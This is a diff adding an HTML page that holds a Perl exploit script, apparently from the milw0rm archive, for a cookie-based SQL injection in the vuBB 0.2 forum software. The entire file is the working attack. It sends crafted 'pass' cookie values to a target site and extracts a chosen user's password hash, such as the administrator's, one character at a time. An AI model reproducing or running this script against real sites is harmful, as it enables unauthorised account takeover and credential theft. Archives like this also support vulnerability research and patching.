@@ -1,0 +1,77 @@
+<html>
+<head>
+<title>vuBB <= 0.2 (Cookie) Final Remote SQL Injection Exploit (gpc=off)</title>
+<pre>
+#!/usr/bin/perl 
+print q{
+----------------------------------------------------------------------
+
+	vuBB &lt;=0.2 Final Remote SQL Injection (cookies) Exploit
+	
+		exploit discovered and coded by KingOfSKa
+			
+			https://contropotere.netsons.org
+
+----------------------------------------------------------------------
+
+};
+
+use LWP::UserAgent;
+
+   $ua = new LWP::UserAgent;
+   $ua-&gt;agent(&quot;Mosiac 1.0&quot; . $ua-&gt;agent);
+
+if (!$ARGV[0]) {$ARGV[0] = '';}
+if (!$ARGV[1]) {$ARGV[1] = '1';}
+
+my $path = $ARGV[0] . '/index.php';
+my $user = $ARGV[1];   # userid to jack
+my $uname = $ARGV[2];
+my $answer = &quot;&quot;;
+my @charset = (&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;);
+if (!$ARGV[2])
+{
+        print q{
+		Usage:
+		
+		perl vubb.pl FULL_URL_TO_VBB VICTIM_USER_ID USER_NICKNAME
+		perl vubb.pl http://www.somesite.com/vubb 1 administrator
+		
+		};
+exit();
+
+}
+print &quot;[URL:] $path\r\n&quot;;
+print &quot;[USERID:] $user\r\n&quot;;
+print &quot;[USERNAME:] $user\r\n&quot;;
+print &quot;Starting connection...\r\n&quot;;
+
+my $j = 0 ;
+for( $i=1; $i &lt; 33; $i++ )
+{
+        for( $j=1; $j &lt; 17; $j++ )
+        {
+	
+                $current = $charset[$j];
+		
+  my $sql = &quot;99%27+OR+(id%3d&quot;.$user.&quot;+AND+MID(pass,&quot;.$i.&quot;,1)%3d%27&quot;.$charset[$j].&quot;%27)/*&quot;; 
+                my @cookie = ('Cookie' =&gt; &quot;user=kingofska; pass=$sql;&quot;);
+                my $res = $ua-&gt;get($path, @cookie);
+
+                $answer = $res-&gt;content;
+		#print $answer; #Just for debugging...
+		if ($answer =~/(.*)Welcome $uname(.*)/){$outputs.= $current; print &quot;$i/32 found...\r\n&quot;; }
+	}
+
+ 
+}
+
+
+if ( length($outputs) &lt; 1 )   { print &quot;Not Exploitable!\r\n&quot;; exit;     }
+print  &quot;User Hash is: $outputs \r\n&quot;;
+exit;
+
+# milw0rm.com [2006-03-01]
+</pre>
+</html>
+
